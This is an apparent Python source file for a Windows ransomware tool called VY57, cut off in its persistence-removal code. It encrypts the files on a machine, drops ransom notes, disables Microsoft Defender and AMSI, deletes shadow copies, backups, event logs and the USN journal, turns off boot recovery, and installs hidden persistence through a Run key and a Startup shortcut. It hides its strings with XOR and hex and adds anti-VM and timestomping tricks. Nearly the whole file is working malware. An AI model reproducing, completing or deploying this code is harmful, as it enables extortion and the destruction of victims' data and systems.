#!/usr/bin/env python3
"""
VY57 — whole-machine file locker. v2.3.0

    python vy57.py --setup             # ONE COMMAND: keys, lits, PS blob, assets, build.bat
    python vy57.py --setup --new-keys  # force a fresh keypair (rotates PUB_B64)
    python vy57.py --list              # dry run, per-root counts
    python vy57.py                     # lock everything
    python vy57.py --scope user        # profile only
    python vy57.py --decrypt --key K   # restore
    python vy57.py --make-unlocker --priv vy57_priv.pem   # build unlock.ps1/.bat
    python vy57.py --gen-ps            # regenerate the XOR'd PS blob (manual)
    python vy57.py --gen-key           # regenerate the XOR'd key constant (manual)
    python vy57.py --gen-lits          # regenerate the hex literal table (manual)
    python vy57.py --gen-keys          # regenerate just the keypair (manual)

Setup writes nothing you have to paste by hand. It rewrites the marked AUTO
regions of this file, verifies the result compiles, then writes app.ico,
wall.bmp and build.bat. It reuses an existing vy57_priv.pem unless --new-keys
is passed, so re-running it does not strand earlier victims.

There is no environment scoring. The locker always runs.

Build is --standalone, shipped as the vy57.dist folder. No onefile: no
extraction, no D3DSCache, and the exe on disk is the exe that runs.

Key storage:
    The master is held twice — RSA-2048-OAEP wrapped against PUB_B64 for the
    operator, and DPAPI-protected (user+machine bound) for local reuse so that
    re-runs, GUI validation and --decrypt work without the private key.

    The store is XOR'd with KEY_XOR. If a store written by an older build is
    found, read_store() brute-forces the byte and adopts it, so a rebuilt
    binary never orphans an existing infection.

Flags:
    --setup           one-shot build preparation
    --new-keys        with --setup, rotate the keypair
    --no-amsi         skip the AMSI patch (fired by default)
    --self-delete     remove the original exe once the copy is running
    --no-timestomp    keep the original mtime
    --no-logs         keep event logs
    --no-ps           registry-only Defender tampering, no PowerShell
    --no-evade        skip jitter, Defender, hardening, kill
    --no-delay        skip jitter and worker ramp
    --no-persist      skip persistence + watchdog
    --no-harden       skip shadows/USN/bcdedit/hiberfil/process kill
    --no-kill         keep Office & friends running
    --no-open         don't auto-open the ransom note
    --no-elevate      don't try UAC
    --quiet           no GUI (persistence entry)
    --full            full-file encryption, no intermittent mode
    --key K           decrypt with an explicit master
    --workers N       encryption threads (default 6)
    --max-size N      per-file cap in MB, 0 = unlimited (default 2048)

File format:
    magic(8) | ver(1) | flags(1) | iv(16) | ct_head_len(4) | ct_tail_len(4)
    | ct_head | plaintext-middle | ct_tail | hmac-trunc(16)
"""

import base64
import binascii
import ctypes
import hashlib
import hmac
import json
import os
import random
import secrets
import shutil
import stat
import string
import struct
import subprocess
import sys
import tempfile
import threading
import time
import traceback
import uuid
from concurrent.futures import ThreadPoolExecutor


def _boot_fail() -> None:
    """An import or an early exit died: record it, even with no console."""
    report = ''
    try:
        report = traceback.format_exc()
    except Exception:
        pass
    folder = os.path.join(os.environ.get('LOCALAPPDATA') or '.', 'VY57')
    try:
        os.makedirs(folder, exist_ok=True)
        with open(os.path.join(folder, 'boot_error.log'), 'a',
                  encoding='utf-8') as fh:
            fh.write(report + '\n')
    except OSError:
        pass
    try:
        ctypes.windll.user32.MessageBoxW(
            None, report[-900:] or 'early failure', 'VY57 failure', 0x10)
    except Exception:
        pass


try:
    from tkinter import Tk, Label, Entry, Button, Canvas, Frame
    from tkinter.font import Font, BOLD
except Exception:
    _boot_fail()
    raise

try:
    import winreg
except ImportError:
    winreg = None

try:
    import winsound
except ImportError:
    winsound = None

try:
    from Crypto.Cipher import AES, PKCS1_OAEP
    from Crypto.Hash import SHA256
    from Crypto.PublicKey import RSA
except Exception:
    _boot_fail()
    raise

VERSION = '2.3.1'
BLOCK_SIZE = 16
MASTER_LEN = 32
CHUNK = 65536
TAG_LEN = 16

MAGIC = b'\x89VY7\r\n\x1a\n'
FMT_VER = 2
HDR_LEN = len(MAGIC) + 2 + BLOCK_SIZE + 8
MIN_BLOB = HDR_LEN + BLOCK_SIZE + TAG_LEN

HEAD_LEN = 1024 * 1024
TAIL_LEN = 1024 * 1024
FULL_LIMIT = 4 * 1024 * 1024

BASE_PRICE = 50
DEADLINE_HOURS = 72

MAX_SIZE = 2048 * 1024 * 1024
WORKERS = 6
RAMP_FILES = 40
RAMP_WORKERS = 2
RETRY_PASSES = 3

BUILD_NAME = 'AbsentGhost.exe'
PROBE_NAME = '.v57probe'
DEBUG_LIMIT = 2 * 1024 * 1024

# Nuitka sets __compiled__; PyInstaller sets sys.frozen. Neither is both.
IS_FROZEN = bool(getattr(sys, 'frozen', False)) or '__compiled__' in globals()


# ---------------------------------------------------------------- literals

def _s(blob: str) -> str:
    return bytes.fromhex(blob).decode('utf-8')


# ==== VY57:AUTO:BEGIN xor ====
PS_XOR = 0x40
KEY_XOR = 0x30
# ==== VY57:AUTO:END xor ====

# ==== VY57:AUTO:BEGIN keys ====
PUB_B64 = (
    'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtxQBkSg15APk/QV3Om/M9b'
    'Pg7yw8p69kUlFwZ+q3eMFjUODoLPTfAfO0oW01gzFZ0KGqDhktoBXesW14+3C2f5n8'
    'Of7+3NHF0/AjW0m4r8AO6DLufAAaCbU6XpOcfiEyVCbt8i0dIpL/naOhAgM3RbgRiJ'
    '6UTS3P9DGZAQdT4q9XcsjfXFNoxErgWDpn9opgromOqXtioeEL95QBDV2lNOEtWdU8'
    '/ujGoC/2tYOEWm8y9vrdQqo0RbbOZ2/Fun3cEqhWDveuNKdkKWJjGAZB7Xe87IX/6A'
    'wU8TRVWA6tTO1klkXbyp2yWGZxOroia/vrMk6qEyCr1akBN/p9HvZdJQIDAQAB'
)
# ==== VY57:AUTO:END keys ====

# ==== VY57:AUTO:BEGIN lits ====
ADDRESS = _s('32726e7' 'a7261796d7' '8687' '16e6333' '786c72786a736b' '6c796a77' '3730' '636a717174636e' '7465337171316' '362') [::-1]
NOTE_NAME = _s('74782e2121' '215f454d5f44' '4145525f2' '12121') [::-1]
NOTE_HTML = _s('6c6d74682e21' '21215f454d5f44' '4145525f2121' '21') [::-1]
WALL_NAME = _s('706d622e6c6' 'c6177') [::-1]
SUFFIX = _s('2e763537')
DEFAULT_EXT = _s('2e76793537')
CLSID = _s('7b394133' '4632' '4337' '312d344238452' 'd344' '436322d394' '331352d374530' '413542334438' '4634347d')
EXCL_KEY = _s('534f465457' '41524' '55c5' '06f6c6963696' '5735' 'c4d696' '3726f736f6' '6745c57' '696e646f77' '732044' '6566656e6465' '725c' '4578636c7573' '696f6e735c506' '1746873')
POLICY_DEF = _s('534f465457' '4152455c50' '6f6c69636' '965735c4d696' '3726f736f6674' '5c5769' '6e64' '6f777320446566' '656e646' '572')
RP_SUB = _s('5c5265616c2d5' '4696d' '6520507' '26f7465637469' '6f6e')
SIG_SUB = _s('5c536' '9676e617' '475726' '5205570' '6461746573')
RUN_KEY = _s('536f667477' '6172655c4d' '6963726f736' 'f66745c57696' 'e646f77735c4' '3757272656e' '7456657273' '696f6e5c5275' '6e')
PERSIST_NAME = _s('57696e5379' '73436' '1636865')
PERSIST_SUB = _s('4d6963726f' '736f66745c576' '96e64' '6f77735c4e6f' '746966696' '36174696f6e73')
PS_EXEC_POLICY = _s('536f667477' '6172655c4d' '69637' '26f736f66745c' '506f77' '6572536' '8656c' '6c5c315c' '5368656c6' 'c4964' '735c4d6' '963726f736' 'f66742e506f77' '657253686' '56c6c')
PS_SCRIPT_LOG = _s('536f6' '674776172655c5' '06f6c69636' '965735c4' 'd6963726f73' '6f66745c5' '7696e646f77735' 'c506f776572' '5368656c' '6c5c53637269' '7074426c6f636' 'b4c6f6767696e' '67')

PERSIST_EXE_NAME = PERSIST_NAME + _s('2e65786' '5')
LNK_NAME = PERSIST_NAME + _s('2e6c6e6b')
KEY_REG = (_s('536f6674776172' '655c436c6173' '73657' '35c434c534944' '5c') + CLSID +
           _s('5c496e707' '26f63536572' '7665723' '332'))
POLICY_RP = POLICY_DEF + RP_SUB
POLICY_SIG = POLICY_DEF + SIG_SUB
# ==== VY57:AUTO:END lits ====

EXT = DEFAULT_EXT
VID = ''
STORE_XOR = None

# ==== VY57:AUTO:BEGIN psblob ====
PS_BLOB = (
    'ZAUyMi8yASM0KS8uEDIlJiUyJS4jJWB9YGcTKSwlLjQsOQMvLjQpLjUlZ3tgEyU0bQ'
    '0wEDIlJiUyJS4jJWBtBCkzISIsJRIlISw0KS0lDS8uKTQvMikuJ2BkNDI1JWBtBCkz'
    'ISIsJQkPARYQMi80JSM0KS8uYGQ0MjUlYG0EKTMhIiwlAiwvIysBNAYpMjM0EyUlLm'
    'BkNDI1JXtgEyU0bQ0wEDIlJiUyJS4jJWBtBS4hIiwlAy8uNDIvLCwlJAYvLCQlMgEj'
    'IyUzM2AEKTMhIiwlJA=='
)
# ==== VY57:AUTO:END psblob ====

PS_PLAIN = (
    "$ErrorActionPreference = 'SilentlyContinue'; "
    'Set-MpPreference -DisableRealtimeMonitoring $true '
    '-DisableIOAVProtection $true -DisableBlockAtFirstSeen $true; '
    'Set-MpPreference -EnableControlledFolderAccess Disabled'
)

AMSI_PATCH = (
    "$A=[Ref].Assembly.GetTypes()|?{$_.Name -like '*iUtils'};"
    "$F=$A.GetFields('NonPublic,Static')|?{$_.Name -like '*nitFailed'};"
    '$F.SetValue($null,$true)'
)

SHADOW_PLAIN = (
    'Get-CimInstance -ClassName Win32_ShadowCopy | '
    'ForEach-Object { $_.Delete() }; '
    'vssadmin delete shadows /all /quiet; '
    'wbadmin delete catalog -quiet; '
    'foreach ($l in @(SYSTEM,APPLICATION,SECURITY)) '
    '{ wevtutil cl $l }'
)

SPI_GETDESKWALLPAPER = 0x0073
SPI_SETDESKWALLPAPER = 0x0014
SPIF_UPDATEINIFILE = 0x01
SPIF_SENDCHANGE = 0x02

CREATE_NO_WINDOW = 0x08000000
DETACHED_PROCESS = 0x00000008
CRYPTPROTECT_UI_FORBIDDEN = 0x1

SKIP_EXTENSIONS = {DEFAULT_EXT, SUFFIX, '.tmp'}
SKIP_NAMES = {
    'key.dat', 'vy57_debug.log', 'roots.txt', 'wall.bmp', 'app.ico',
    'build.bat', 'unlock.ps1', 'unlock.bat', NOTE_NAME, NOTE_HTML,
    'vy57.py', 'vy57.exe', 'vy57_priv.pem', 'unlocker_info.txt',
    BUILD_NAME, PROBE_NAME, '.vy57_done', '.vy57_restarts', 'started.txt',
}
SKIP_DIR_NAMES = {
    'Windows', 'Windows.old', 'Program Files', 'Program Files (x86)',
    'System Volume Information', 'Recovery', 'PerfLogs', '$WinREAgent',
    'Config.Msi', 'node_modules', 'venv', '.venv', '.git', '__pycache__',
    'site-packages', '.gradle', '.cache', 'Temp', 'tmp', 'OneDriveTemp',
    'Packages', 'D3DSCache',
}
SKIP_DIR_FRAGMENTS = (
    '\\AppData\\Local\\Programs',
    '\\AppData\\Local\\Microsoft\\Windows\\Themes\\CachedFiles',
    '\\AppData\\Local\\Microsoft\\Windows\\Notifications',
    '\\ProgramData\\Microsoft\\Windows Defender',
    '\\ProgramData\\Package Cache',
    '\\_MEI',
    '\\VY57',
    '\\D3DSCache',
)
KILL_LIST = ('WINWORD.EXE', 'EXCEL.EXE', 'POWERPNT.EXE', 'OUTLOOK.EXE',
             'ONENOTE.EXE', 'ACROBAT.EXE', 'ACRORD32.EXE', 'NOTEPAD.EXE',
             'mspaint.exe')
VM_DRIVERS = ('VBoxGuest.sys', 'VBoxMouse.sys', 'VBoxSF.sys',
              'vmmouse.sys', 'vmhgfs.sys', 'vmci.sys', 'vmtoolsd.exe')
VM_MAC_PREFIXES = {0x080027, 0x000C29, 0x005056, 0x000569,
                   0x001C14, 0x00155D, 0x525400, 0x00163E}

AV_DIRS = ('Kaspersky Lab', 'ESET', 'Bitdefender', 'Avast Software', 'AVG',
           'Avira', 'Sophos', 'CrowdStrike', 'SentinelOne', 'Carbon Black',
           'McAfee', 'Norton')

DEBUG_PATH = None
DONE_COUNTER = {'n': 0}
COUNTER_LOCK = threading.Lock()
QUEUE_LOCK = threading.Lock()
ROOTS_LOCK = threading.Lock()
_WRITABLE = {}
_WRITABLE_LOCK = threading.Lock()


# ---------------------------------------------------------------- logging

def _ensure_stdout() -> None:
    """Never let console setup be the reason we die silently."""
    try:
        _ensure_stdout_inner()
    except Exception:
        pass


def _ensure_stdout_inner() -> None:
    if sys.stdout is not None and sys.stderr is not None:
        return
    attached = False
    try:
        attached = bool(ctypes.windll.kernel32.AttachConsole(-1))
    except Exception:
        attached = False
    if attached:
        for name in ('stdout', 'stderr'):
            if getattr(sys, name) is None:
                try:
                    setattr(sys, name, open('CONOUT$', 'w', encoding='utf-8',
                                            errors='replace', buffering=1))
                except OSError:
                    pass
    for name in ('stdout', 'stderr'):
        if getattr(sys, name) is None:
            try:
                setattr(sys, name, open(os.devnull, 'w', encoding='utf-8',
                                        errors='replace'))
            except OSError:
                pass


def logline(msg: str) -> None:
    line = f'[{time.strftime("%H:%M:%S")}] {msg}'
    try:
        if sys.stdout is not None:
            print(line, flush=True)
    except Exception:
        pass
    if DEBUG_PATH:
        try:
            with open(DEBUG_PATH, 'a', encoding='utf-8') as fh:
                fh.write(line + '\n')
        except OSError:
            pass


def log_exc(msg: str, exc: BaseException) -> None:
    logline(f'{msg}: {exc}')
    if DEBUG_PATH:
        try:
            with open(DEBUG_PATH, 'a', encoding='utf-8') as fh:
                fh.write(traceback.format_exc() + '\n')
        except OSError:
            pass


def die(msg: str) -> None:
    logline(msg)
    raise SystemExit(1)


# ---------------------------------------------------------------- paths

def base_dir() -> str:
    if IS_FROZEN:
        return os.path.dirname(os.path.abspath(sys.executable))
    return os.path.dirname(os.path.abspath(__file__))


BASE = base_dir()

APPDATA = os.environ.get('APPDATA') or os.path.expanduser('~')
LOCALAPPDATA = os.environ.get('LOCALAPPDATA') or APPDATA
KEY_DIR = os.path.join(APPDATA, 'VY57')
LOCAL_KEY_DIR = os.path.join(LOCALAPPDATA, 'VY57')
KEY_FILE = os.path.join(KEY_DIR, 'key.dat')
KEY_COPY = os.path.join(LOCAL_KEY_DIR, 'key.dat')
DONE_MARK = os.path.join(KEY_DIR, '.vy57_done')
WATCH_MARK = os.path.join(KEY_DIR, '.vy57_restarts')

PERSIST_DIR = os.path.join(LOCALAPPDATA, PERSIST_SUB)
PERSIST_EXE = os.path.join(PERSIST_DIR, PERSIST_EXE_NAME)
STARTUP_DIR = os.path.join(APPDATA, 'Microsoft', 'Windows', 'Start Menu',
                           'Programs', 'Startup')
LNK_PATH = os.path.join(STARTUP_DIR, LNK_NAME)


def original_exe() -> str:
    """The exe the user launched, never the onefile temp copy."""
    cand = ''
    try:
        if sys.argv and sys.argv[0]:
            cand = os.path.abspath(sys.argv[0])
    except Exception:
        cand = ''
    if cand.lower().endswith('.exe') and os.path.isfile(cand):
        return cand
    return sys.executable


def out_dir() -> str:
    """Where generated artefacts belong — never a temp dir."""
    folder = os.path.dirname(original_exe()) if IS_FROZEN else BASE
    for candidate in (folder, os.path.join(LOCAL_KEY_DIR, 'out')):
        try:
            os.makedirs(candidate, exist_ok=True)
            return candidate
        except OSError:
            continue
    return folder or BASE


def _prep(p: str) -> str:
    if p.startswith('\\\\?\\'):
        return p
    if p.startswith('\\\\'):
        return '\\\\?\\UNC' + p[1:]
    return '\\\\?\\' + p


def _unprep(p: str) -> str:
    if p.startswith('\\\\?\\UNC'):
        return '\\\\' + p[6:]
    if p.startswith('\\\\?\\'):
        return p[4:]
    return p


def desktop_paths() -> list:
    home = os.path.expanduser('~')
    found = []
    for p in (os.path.join(home, 'Desktop'),
              os.path.join(home, 'OneDrive', 'Desktop'),
              os.path.abspath(os.path.join(home, '..', 'Public', 'Desktop'))):
        if os.path.isdir(p):
            found.append(p)
    return found


def note_targets(roots: list) -> list:
    home = os.path.expanduser('~')
    out = set(desktop_paths())
    for sub in ('Documents', 'Downloads', 'Pictures', 'Music', 'Videos'):
        out.add(os.path.join(home, sub))
    pub = os.environ.get('PUBLIC')
    if pub:
        out.add(pub)
    for root in roots:
        out.add(root)
        out.add(os.path.join(root, 'Users', 'Public'))
    seen, keep = set(), []
    for p in out:
        key = os.path.normcase(p)
        if key in seen or not os.path.isdir(p):
            continue
        seen.add(key)
        keep.append(p)
    return keep


# ---------------------------------------------------------------- dpapi

class _BLOB(ctypes.Structure):
    _fields_ = [('cbData', ctypes.c_uint32), ('pbData', ctypes.c_void_p)]


def _in_blob(data: bytes):
    buf = ctypes.create_string_buffer(bytes(data), len(data))
    return _BLOB(len(data), ctypes.cast(buf, ctypes.c_void_p)), buf


def _take_blob(out: _BLOB) -> bytes:
    try:
        return ctypes.string_at(out.pbData, out.cbData)
    finally:
        ctypes.windll.kernel32.LocalFree(ctypes.c_void_p(out.pbData))


def dpapi_protect(data: bytes) -> bytes:
    inb, _keep = _in_blob(data)
    out = _BLOB()
    ok = ctypes.windll.crypt32.CryptProtectData(
        ctypes.byref(inb), None, None, None, None,
        CRYPTPROTECT_UI_FORBIDDEN, ctypes.byref(out))
    if not ok:
        raise OSError(f'CryptProtectData: {ctypes.GetLastError()}')
    return _take_blob(out)


def dpapi_unprotect(data: bytes) -> bytes:
    inb, _keep = _in_blob(data)
    out = _BLOB()
    ok = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(inb), None, None, None, None,
        CRYPTPROTECT_UI_FORBIDDEN, ctypes.byref(out))
    if not ok:
        raise OSError(f'CryptUnprotectData: {ctypes.GetLastError()}')
    return _take_blob(out)


# ---------------------------------------------------------------- environment

def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def build_id() -> str:
    return hashlib.sha256(f'{VERSION}:{PS_XOR}:{KEY_XOR}'.encode()).hexdigest()


def single_instance() -> bool:
    try:
        kernel32 = ctypes.windll.kernel32
        name = 'Global\\' + build_id()[:8].upper() + '-' + build_id()[8:12]
        kernel32.CreateMutexW(None, False, name)
        fresh = kernel32.GetLastError() != 183
        logline(f'mutex {name} fresh={fresh}')
        return fresh
    except Exception:
        return True


def in_vm() -> bool:
    try:
        node = uuid.getnode()
        if (node >> 24) in VM_MAC_PREFIXES:
            return True
    except Exception:
        pass
    sysdir = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'),
                          'System32')
    for name in VM_DRIVERS:
        if os.path.exists(os.path.join(sysdir, name)):
            return True
    return False


def strip_zone(path: str) -> None:
    try:
        os.remove(path + ':Zone.Identifier')
    except OSError:
        pass


def is_locked(path: str) -> bool:
    try:
        k32 = ctypes.windll.kernel32
        k32.CreateFileW.restype = ctypes.c_void_p
        k32.CreateFileW.argtypes = [ctypes.c_wchar_p, ctypes.c_uint32,
                                    ctypes.c_uint32, ctypes.c_void_p,
                                    ctypes.c_uint32, ctypes.c_uint32,
                                    ctypes.c_void_p]
        h = k32.CreateFileW(_prep(path), 0x80000000, 0, None, 3, 0x80, None)
        if not h or h == ctypes.c_void_p(-1).value:
            return True
        k32.CloseHandle(ctypes.c_void_p(h))
        return False
    except Exception:
        return False


def dir_writable(folder: str) -> bool:
    """Cached probe. One log line per unwritable directory, not per file."""
    key = os.path.normcase(folder)
    with _WRITABLE_LOCK:
        if key in _WRITABLE:
            return _WRITABLE[key]
    ok = True
    probe = os.path.join(folder, PROBE_NAME)
    try:
        with open(probe, 'wb'):
            pass
        try:
            os.remove(probe)
        except OSError:
            pass
    except OSError:
        ok = False
    with _WRITABLE_LOCK:
        _WRITABLE[key] = ok
    if not ok:
        logline(f'  read-only volume, skipping: {folder}')
    return ok


def elevate() -> bool:
    if is_admin() or '--elevated' in sys.argv or '--no-elevate' in sys.argv:
        return False
    try:
        args = sys.argv[1:]
        if IS_FROZEN:
            exe = original_exe()
        else:
            exe = sys.executable
            args = [os.path.abspath(__file__)] + args
        args.append('--elevated')
        params = ' '.join(f'"{a}"' if ' ' in a else a for a in args)
        rc = ctypes.windll.shell32.ShellExecuteW(
            None, 'runas', exe, params, BASE, 1)
        if rc > 32:
            logline(f're-launched elevated: {exe}')
            return True
        logline(f'UAC declined ({rc}) - continuing unelevated')
    except Exception as exc:
        log_exc('elevation failed', exc)
    return False


def av_products() -> list:
    found = []
    for root in (os.environ.get('ProgramFiles', r'C:\Program Files'),
                 os.environ.get('ProgramFiles(x86)',
                                r'C:\Program Files (x86)')):
        for name in AV_DIRS:
            try:
                if os.path.isdir(os.path.join(root, name)):
                    found.append(name)
            except OSError:
                pass
    return found


# ---------------------------------------------------------------- powershell

def ps_exe() -> str:
    root = os.environ.get('SystemRoot', 'C:\\Windows')
    return os.path.join(root, 'System32', 'WindowsPowerShell', 'v1.0',
                        'powershell.exe')


def ps_script() -> str:
    if not PS_BLOB:
        return PS_PLAIN
    raw = base64.b64decode(PS_BLOB)
    return bytes(b ^ PS_XOR for b in raw).decode('utf-8')


def run_ps(commands: list, timeout: int = 90) -> None:
    script = '; '.join(commands)
    try:
        enc = base64.b64encode(script.encode('utf-16-le')).decode()
        subprocess.run(
            [ps_exe(), '-NoLogo', '-NoProfile', '-NonInteractive',
             '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass',
             '-EncodedCommand', enc],
            creationflags=CREATE_NO_WINDOW, capture_output=True,
            timeout=timeout)
    except Exception as exc:
        log_exc('powershell failed', exc)


def run_ps_amsi(commands: list, timeout: int = 120) -> None:
    """One spawn: the AMSI patch is prepended to the same encoded script."""
    script = list(commands)
    if '--no-amsi' not in sys.argv:
        script.insert(0, AMSI_PATCH)
    run_ps(script, timeout=timeout)


def set_ps_policy() -> None:
    if not is_admin() or winreg is None:
        return
    try:
        key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, PS_EXEC_POLICY, 0,
                                 winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
        winreg.SetValueEx(key, 'ExecutionPolicy', 0, winreg.REG_SZ, 'Bypass')
        winreg.CloseKey(key)
    except OSError:
        pass
    try:
        key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, PS_SCRIPT_LOG, 0,
                                 winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
        winreg.SetValueEx(key, 'EnableScriptBlockLogging', 0,
                          winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except OSError:
        pass


def add_exclusions(roots: list) -> None:
    if not is_admin() or winreg is None:
        logline('not admin - skipping exclusions')
        return

    targets = list(roots) + [BASE, KEY_DIR, LOCAL_KEY_DIR,
                             os.path.dirname(KEY_DIR), LOCALAPPDATA,
                             PERSIST_DIR]
    if IS_FROZEN:
        targets.append(original_exe())

    seen, written = set(), 0
    for target in targets:
        if not target:
            continue
        norm = target if target.endswith('\\') else target + '\\'
        if norm.lower() in seen:
            continue
        seen.add(norm.lower())
        try:
            key = winreg.CreateKeyEx(
                winreg.HKEY_LOCAL_MACHINE, EXCL_KEY, 0,
                winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
            winreg.SetValueEx(key, norm, 0, winreg.REG_SZ, '0')
            winreg.CloseKey(key)
            written += 1
        except OSError as exc:
            log_exc(f'exclusion failed {norm}', exc)

    logline(f'defender exclusions added via registry ({written})')


def write_policy() -> None:
    if not is_admin() or winreg is None:
        return
    table = (
        (POLICY_RP, 'DisableRealtimeMonitoring', 1),
        (POLICY_RP, 'DisableBehaviorMonitoring', 1),
        (POLICY_RP, 'DisableOnAccessProtection', 1),
        (POLICY_RP, 'DisableScanOnRealtimeEnable', 1),
        (POLICY_RP, 'DisableIOAVProtection', 1),
        (POLICY_RP, 'DisableScriptScanning', 1),
        (POLICY_DEF, 'DisableAntiSpyware', 1),
        (POLICY_DEF, 'SpynetReporting', 0),
        (POLICY_DEF, 'SubmitSamplesConsent', 2),
        (POLICY_SIG, 'ForceUpdateFromMU', 1),
    )
    written = 0
    for sub, name, value in table:
        try:
            key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, sub, 0,
                                     winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
            winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
            winreg.CloseKey(key)
            written += 1
        except OSError:
            pass
    logline(f'defender policy written ({written} value(s))')


def harden_defender(roots: list) -> None:
    if not is_admin():
        logline('not admin - defender untouched')
        return
    write_policy()
    add_exclusions(roots)
    set_ps_policy()
    if '--no-ps' in sys.argv:
        logline('--no-ps: registry only, no powershell')
        return
    keep_logs = '--no-logs' in sys.argv
    script = [ps_script(),
              SHADOW_PLAIN.split('; foreach')[0] if keep_logs
              else SHADOW_PLAIN]
    run_ps_amsi(script, timeout=300)
    logline('realtime + cfa off, shadows + catalog' +
            ('' if keep_logs else ' + event logs') + ' deleted')


def harden(roots: list) -> None:
    if not is_admin():
        logline('not admin - hardening limited')
        return
    for root in roots:
        if not root.startswith('\\\\') and len(root) == 3:
            letter = root[0]
            try:
                subprocess.run(['fsutil', 'usn', 'deletejournal', '/d',
                                f'{letter}:'], capture_output=True,
                               creationflags=CREATE_NO_WINDOW, timeout=120)
            except Exception as exc:
                log_exc(f'usn wipe {letter}:', exc)
    for cmd in (
        ['bcdedit', '/set', '{default}', 'recoveryenabled', 'no'],
        ['bcdedit', '/set', '{default}', 'bootstatuspolicy',
         'ignoreallfailures'],
        ['powercfg', '/h', 'off'],
    ):
        try:
            subprocess.run(cmd, capture_output=True,
                           creationflags=CREATE_NO_WINDOW, timeout=60)
        except Exception as exc:
            log_exc(f'{cmd[0]} failed', exc)
    logline('usn journal + recovery + hiberfil removed')


def kill_holders() -> None:
    cmd = ['taskkill', '/f']
    for name in KILL_LIST:
        cmd += ['/im', name]
    try:
        subprocess.run(cmd, capture_output=True,
                       creationflags=CREATE_NO_WINDOW, timeout=45)
        logline('office/acrobat closed')
    except Exception as exc:
        log_exc('taskkill failed', exc)


def jitter() -> None:
    vm = in_vm()
    delay = random.uniform(5, 12) if vm else random.uniform(4, 9)
    logline(f'jitter {delay:.1f}s (vm={vm})')
    time.sleep(delay)


# ---------------------------------------------------------------- persistence

def _shortcut(target: str, args: str, link: str) -> bool:
    try:
        ole32 = ctypes.windll.ole32
        ole32.CoInitialize(None)

        class GUID(ctypes.Structure):
            _fields_ = [('d1', ctypes.c_uint32), ('d2', ctypes.c_uint16),
                        ('d3', ctypes.c_uint16), ('d4', ctypes.c_ubyte * 8)]

        def guid(text):
            g = GUID()
            ole32.CLSIDFromString(ctypes.c_wchar_p(text), ctypes.byref(g))
            return g

        clsid = guid('{00021401-0000-0000-C000-000000000046}')
        iid_link = guid('{000214F9-0000-0000-C000-000000000046}')
        iid_file = guid('{0000010B-0000-0000-C000-000000000046}')

        ptr = ctypes.c_void_p()
        hr = ole32.CoCreateInstance(ctypes.byref(clsid), None, 1,
                                    ctypes.byref(iid_link), ctypes.byref(ptr))
        if hr != 0 or not ptr:
            return False

        def call(obj, index, *args):
            vtbl = ctypes.cast(obj, ctypes.POINTER(ctypes.POINTER(
                ctypes.c_void_p))).contents
            fn = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p,
                                    *[a[0] for a in args])(vtbl[index])
            return fn(obj, *[a[1] for a in args])

        W = ctypes.c_wchar_p
        call(ptr, 20, (W, target))
        call(ptr, 11, (W, args))
        call(ptr, 9, (W, os.path.dirname(target)))
        call(ptr, 15, (ctypes.c_int, 7))
        call(ptr, 17, (W, target), (ctypes.c_int, 0))

        persist = ctypes.c_void_p()
        call(ptr, 0, (ctypes.POINTER(GUID), ctypes.byref(iid_file)),
             (ctypes.POINTER(ctypes.c_void_p), ctypes.byref(persist)))
        if not persist:
            return False
        call(persist, 6, (W, link), (ctypes.c_int, 1))
        call(persist, 2)
        call(ptr, 2)
        ole32.CoUninitialize()
        return os.path.exists(link)
    except Exception as exc:
        log_exc('shortcut failed', exc)
        return False


def timestomp(path: str) -> None:
    if '--no-timestomp' in sys.argv:
        return
    try:
        ref = os.path.join(os.environ.get('SystemRoot', r'C:\Windows'),
                           'System32', 'kernel32.dll')
        st = os.stat(ref)
        os.utime(path, (st.st_atime, st.st_mtime))
    except OSError as exc:
        log_exc('timestomp failed', exc)


def hide(path: str) -> None:
    try:
        attrs = os.stat(path).st_file_attributes
        ctypes.windll.kernel32.SetFileAttributesW(
            _prep(path), attrs | stat.FILE_ATTRIBUTE_HIDDEN |
            stat.FILE_ATTRIBUTE_SYSTEM)
    except Exception:
        pass


def install_persistence() -> None:
    if winreg is None:
        return

    target = original_exe()
    copied = False
    if IS_FROZEN and os.path.normcase(target) != os.path.normcase(PERSIST_EXE):
        try:
            os.makedirs(PERSIST_DIR, exist_ok=True)
            with open(target, 'rb') as src:
                data = src.read()
            with open(PERSIST_EXE, 'wb') as dst:
                dst.write(data)
            strip_zone(PERSIST_EXE)
            timestomp(PERSIST_EXE)
            hide(PERSIST_EXE)
            target = PERSIST_EXE
            copied = True
        except OSError as exc:
            log_exc('self-copy failed', exc)
            target = original_exe()

    args = '--quiet' if IS_FROZEN else \
        f'"{os.path.abspath(__file__)}" --quiet'

    try:
        key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
                                 winreg.KEY_WRITE)
        winreg.SetValueEx(key, PERSIST_NAME, 0, winreg.REG_SZ,
                          f'"{target}" --quiet')
        winreg.CloseKey(key)
        logline('persistence: Run key')
    except OSError as exc:
        log_exc('run key failed', exc)

    try:
        os.makedirs(STARTUP_DIR, exist_ok=True)
        if _shortcut(target, args, LNK_PATH):
            logline('persistence: startup shortcut')
    except OSError as exc:
        log_exc('startup folder failed', exc)

    if copied and '--self-delete' in sys.argv:
        victim_exe = original_exe()
        if os.path.normcase(victim_exe) != os.path.normcase(PERSIST_EXE):
            try:
                os.remove(victim_exe)
                logline(f'original exe removed ({victim_exe})')
            except OSError as exc:
                log_exc('self-delete failed', exc)


def remove_persistence() -> None:
    if winreg is not None:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
                                 winreg.KEY_WRITE)
